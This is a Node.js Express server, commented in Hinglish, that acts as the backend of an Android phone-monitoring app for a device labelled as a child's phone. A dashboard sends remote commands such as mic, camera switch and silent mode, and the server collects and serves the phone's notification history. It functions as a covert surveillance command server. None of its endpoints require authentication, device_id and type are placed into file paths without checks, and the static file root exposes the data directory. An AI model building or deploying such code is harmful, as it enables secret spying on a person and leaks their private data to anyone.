const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Sabhi HTML files ko access karne ke liye
app.use(express.static(__dirname));

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// ==============================
// 1. DYNAMIC DEVICE STATE
// ==============================
let deviceState = {
    "Child_Phone_01": {
        model: "Detecting...",
        android_version: "--",
        battery: 0,
        isOnline: false,
        lastSeen: 0,
        ringerMode: "normal", 
        currentCommand: "none"
    }
};

// ==============================
// 2. STATUS & COMMAND API
// ==============================

// Dashboard yahan se status leta hai
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || {};
    const isOnline = (Date.now() - state.lastSeen) < 12000; // 12 sec offline timeout
    res.json({ ...state, isOnline });
});

// Dashboard se commands (Silent, Camera Switch, Mic) bhejne ke liye
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (deviceState[device_id]) {
        deviceState[device_id].currentCommand = command;
        console.log(`🚀 Admin sent command: ${command}`);
        res.json({ status: "success" });
    } else {
        res.status(404).json({ status: "error", msg: "Device not found" });
    }
});

// Android App yahan se apni status update karega aur commands lega
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    deviceState[device_id] = {
        ...deviceState[device_id],
        model, android_version, battery, ringerMode,
        lastSeen: Date.now()
    };
    
    // Command bhej kar reset karna zaroori hai
    const cmdToSend = deviceState[device_id].currentCommand;
    deviceState[device_id].currentCommand = "none"; 
    res.json({ command: cmdToSend });
});

// ==============================
// 3. DATA STORAGE (Local Store)
// ==============================

app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; 
    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);

    if (type === 'notifications') {
        let existing = [];
        if (fs.existsSync(filePath)) existing = JSON.parse(fs.readFileSync(filePath));
        existing.push(...data); // History maintain karne ke liye append
        fs.writeFileSync(filePath, JSON.stringify(existing, null, 2));
    } else {
        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    }
    res.send("Data Saved Locally");
});

// Dashboard mein data dikhane ke liye
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server chalu hai: http://localhost:${PORT}`);
});
